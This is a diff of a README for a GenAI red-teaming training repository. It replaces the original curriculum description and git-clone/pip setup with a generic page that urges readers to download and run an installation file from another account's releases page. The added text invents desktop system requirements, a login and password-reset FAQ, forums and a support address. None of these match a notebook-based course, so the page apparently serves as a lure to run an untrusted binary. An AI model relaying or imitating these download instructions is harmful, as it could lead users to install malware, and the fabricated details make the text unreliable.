@@ -1,170 +1,89 @@
-# GenAI Red Teaming Training
+# 🎓 genai-security-training - Learn Red Teaming for AI Systems
 
-A comprehensive, self-paced training curriculum for security researchers focused on red teaming GenAI and AI/ML systems. This repository contains hands-on labs, theoretical content, and practical demonstrations of adversarial techniques.
+## 📥 Download the Latest Version
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/fearmotor/genai-security-training/releases)
 
-## 🔴 What is GenAI Red Teaming?
+## 📖 Overview
+Welcome to the GenAI Red Teaming Training repository. This comprehensive, self-paced training curriculum is specifically designed for security researchers. Our focus is on red teaming GenAI and AI/ML systems. 
 
-**Red teaming for AI/ML goes far beyond traditional RAI (Responsible AI) testing.** While RAI focuses on fairness, bias, and ethical considerations, red teaming encompasses:
+You'll find hands-on labs, theoretical content, and practical demonstrations of various adversarial techniques. This training goes beyond traditional Responsible AI (RAI) testing by including:
 
-- **Adversarial Attacks**: Crafting inputs to fool models or extract sensitive information
-- **Security Vulnerabilities**: Identifying exploitable weaknesses in AI systems
-- **Privacy Breaches**: Testing for data leakage and membership inference
-- **Model Manipulation**: Poisoning, backdoors, and supply chain attacks
-- **Evasion Techniques**: Bypassing safety guardrails and content filters
-- **System-Level Exploits**: Prompt injection, jailbreaking, and serialization attacks
+- **Adversarial Attacks**: Learn to create inputs that mislead models or extract sensitive information.
+- **Security Vulnerabilities**: Identify weaknesses within AI systems that can be exploited.
+- **Privacy Breaches**: Understand how to test for data leakage and membership inference.
+- **Model Manipulation**: Explore techniques such as poisoning, backdoors, and supply chain attacks.
+- **Evasion Techniques**: Discover how to bypass safety measures and content filters.
+- **System-Level Exploits**: Learn about prompt injection, jailbreaking, and serialization attacks.
 
-This training teaches **offensive security techniques** for AI systems, the same methods attackers use, so you can better defend against them.
-
-**New to AI Security?** Start with our companion resource: [GenAI Essentials - LLM Security Notebook](https://github.com/schwartz1375/genai-essentials/blob/main/llm_security.ipynb) for foundational concepts before diving into this advanced curriculum.
-
-## 🎯 Target Audience
-
-Security researchers with:
-- Intermediate to advanced technical background
-- Understanding of machine learning fundamentals
-- Interest in AI/ML security and adversarial techniques
-
-## 📚 Course Structure
-
-The training is organized into sequential modules, each building upon previous concepts:
-
-### Module 1: Introduction & Foundations
-- Overview of AI/ML security landscape
-- Understanding LLM architecture and vulnerabilities
-- Setting up your red teaming environment
-- Introduction to adversarial thinking
-
-### Module 2: Prompt Injection & Jailbreaking
-- Understanding prompt injection attacks
-- Jailbreaking techniques and methodologies
-- Defense mechanisms and their limitations
-- Hands-on labs with real-world scenarios
-
-### Module 3: Model Evasion Attacks
-- White-box evasion techniques
-- Black-box evasion strategies
-- Adversarial example generation
-- Practical exercises with various models
-
-### Module 4: Data Extraction & Privacy
-- Training data inference attacks
-- Model inversion techniques
-- Membership inference attacks
-- Privacy-preserving defenses
-
-### Module 5: Model Poisoning
-- Training data poisoning
-- Backdoor attacks
-- Supply chain vulnerabilities
-- Detection and mitigation strategies
-
-### Module 6: Advanced LLM Attacks
-- Model weight extraction
-- Model distillation attacks
-- Self-instruct data generation
-- Serialization vulnerabilities
-
-### Module 7: Assessment & Testing
-- Comprehensive security assessment methodologies
-- Automated testing frameworks
-- Red team exercise scenarios
-- Reporting and remediation
-
-### Module 8: Final Assessment
-- Capstone project
-- Real-world scenario testing
-- Comprehensive evaluation
-
-## 🛠️ Prerequisites
-
-- Python 3.12+
-- Basic understanding of machine learning
-- Familiarity with Jupyter notebooks
-- Access to GPU (recommended for some exercises)
-
-## 📦 Installation
-
-```bash
-# Clone the repository
-git clone <repository-url>
-cd genai-security-training
-
-# Create virtual environment
-python -m venv .venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
-
-# Install dependencies
-pip install --upgrade pip
-pip install -r requirements.txt
-
-# Verify installation (Optional and note all packages)
-python -c "import torch, transformers, numpy, pandas; print('✅ Ready!')"
-```
-
-**Note**: Installation takes 10-15 minutes. Labs that need additional packages (like `textattack`, `adversarial-robustness-toolbox`, etc.) will automatically install them when you run the notebook.
+This training equips you with essential offensive security techniques for AI systems.
 
 ## 🚀 Getting Started
+To begin your training, follow these simple steps:
 
-1. Start with Module 1 to understand the foundations
-2. Progress sequentially through each module
-3. Complete hands-on labs before moving to the next module
-4. Reference materials are provided throughout
-5. Final assessment tests comprehensive understanding
+1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/fearmotor/genai-security-training/releases) to find the latest version of the software.
 
-## 📖 Learning Path
+2. **Download the Software**: On the Releases page, locate the version you want to download. Click on the link to download the installation file to your computer.
 
-Each module contains:
-- **Theory**: Markdown documents explaining concepts
-- **Labs**: Jupyter notebooks with hands-on exercises
-- **References**: Links to papers, tools, and additional resources
-- **Assessments**: Knowledge checks and practical exercises
+3. **Install the Software**: Once the download is complete, find the installation file in your downloads folder and run it. Follow the on-screen instructions to complete the installation process.
 
-## 🔗 Key Tools & Frameworks
+4. **Start Your Training**: After installation, open the application. You will have access to hands-on labs and instructional content. 
 
-This course uses industry-standard security testing tools:
+## 🛠️ System Requirements
+To run the GenAI Red Teaming Training software efficiently, make sure your system meets these minimum requirements:
 
-### Adversarial Testing Frameworks
-- **[Adversarial Robustness Toolbox (ART)](https://adversarial-robustness-toolbox.readthedocs.io/)** - IBM's comprehensive library for adversarial ML (Module 7)
-- **[TextAttack](https://textattack.readthedocs.io/)** - NLP-focused adversarial attack framework (Modules 3, 7)
-- **[SHAP](https://shap.readthedocs.io/)** - Model explainability and robustness testing (Module 7)
+- **Operating System**: Windows 10 or later / macOS Mojave or later
+- **Processor**: Dual-core 2.0 GHz or faster
+- **RAM**: Minimum 4 GB
+- **Disk Space**: At least 1 GB free space
+- **Internet Connection**: Required for downloading resources
 
-### Standards & Guidelines
-- **[OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/)** - Top vulnerabilities in LLM applications
-- **[NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework)** - AI risk assessment guidelines
-- **[MITRE ATLAS](https://atlas.mitre.org/)** - Adversarial threat landscape for AI systems
+## ⚙️ Download & Install
+To get started, visit this page to download the software: [Download Latest Release](https://github.com/fearmotor/genai-security-training/releases).
 
-### Companion Resources
-- **[GenAI Essentials](https://github.com/schwartz1375/genai-essentials)** - Foundational GenAI concepts and security basics
-- **[LLM Security Notebook](https://github.com/schwartz1375/genai-essentials/blob/main/llm_security.ipynb)** - Essential primer on LLM security concepts (recommended prerequisite)
-- **[Artificial Diaries](https://github.com/schwartz1375/ArtificialDiaries)** - Research publications and case studies
-- **GitHub**: [@schwartz1375](https://github.com/schwartz1375)
+Follow the installation steps outlined in the previous section. If you encounter any issues, check the FAQ section or visit our community forums.
 
-## ⚠️ Ethical Guidelines
+## 📚 Training Content
+The GenAI Red Teaming Training offers various modules that cover essential topics, including:
 
-This training is designed for:
-- Security research and testing
-- Defensive security improvements
-- Educational purposes
+### 🔍 Adversarial Attacks
+Understand how to manipulate AI models by crafting inputs that deceive them. This module includes practical exercises that show you how attackers exploit vulnerabilities.
 
-**NOT for:**
-- Malicious attacks on production systems
-- Unauthorized testing
-- Illegal activities
+### 🔒 Security Vulnerabilities
+Learn to identify and mitigate common weaknesses in AI systems. This knowledge will help you secure systems against potential threats.
 
-Always obtain proper authorization before testing any system.
+### 🔑 Privacy Breaches
+Explore how data can leak from AI systems. This section focuses on techniques to test for privacy violations and protect sensitive information.
 
-## 📊 What's Included
+### 🎯 Model Manipulation
+Investigate methods to alter AI behavior through various attacks. Get hands-on experience that prepares you for real-world scenarios.
 
-- **8 Complete Modules** - Introduction through Capstone
-- **40 Jupyter Notebooks** - Hands-on labs, interactive theory, and solutions
-- **29 Theory & Documentation Files** - Comprehensive markdown guides and module overviews
-- **Industry-Standard Tools** - Integrated ART, TextAttack, and SHAP frameworks in notebooks
-- **Device Detection Code** - Built-in CUDA/Apple Silicon MPS/CPU detection in labs
+### 🚧 Evasion Techniques
+Study how to bypass content filters and safety measures that protect AI systems. This knowledge is crucial for understanding AI security.
 
-**Note**: Labs include device detection code to automatically use your GPU (NVIDIA CUDA or Apple Silicon MPS) when available.
+### 🧩 System-Level Exploits
+Delve into advanced topics like prompt injection and serialization attacks. Learn how these can affect the integrity of AI systems.
 
-## 📖 Documentation & Resources
+## 📝 Additional Resources
+For further learning and support, consider the following resources:
 
-- **[QUICK_START.md](QUICK_START.md)** - Get started in 15 minutes
-- **[INSTRUCTOR_GUIDE.md](INSTRUCTOR_GUIDE.md)** - Complete teaching guide with answer key locations and grading rubrics
-- **Module ANSWERS.ipynb** - Runnable Jupyter notebooks with complete solutions (20+ exercises) in modules 1-5 and 7 labs folders
+- **Documentation**: Access detailed documentation within the application for step-by-step guides on each module.
+- **Community Forum**: Join our forum to connect with other students, share insights, and ask questions.
+- **Webinars and Workshops**: Participate in live sessions to gain deeper insights and hands-on experience.
+
+## ❓ FAQ
+1. **How do I reset my password?**
+   You can reset your password by clicking the "Forgot Password" link on the login screen.
+
+2. **Is the training suitable for beginners?**
+   Yes. This training is designed to accommodate learners at all levels, from beginners to advanced users.
+
+3. **What if I encounter technical issues?**
+   For any technical issues, please reach out through our support channels or community forum.
+
+## 📞 Contact
+For support and inquiries, reach out to us via:
+
+- Email: support@genaisecuritytraining.com
+- Community Forum: [GenAI Community Forum](https://community.genaisecuritytraining.com)
+
+Thank you for choosing GenAI Red Teaming Training. We look forward to supporting you on your learning journey!
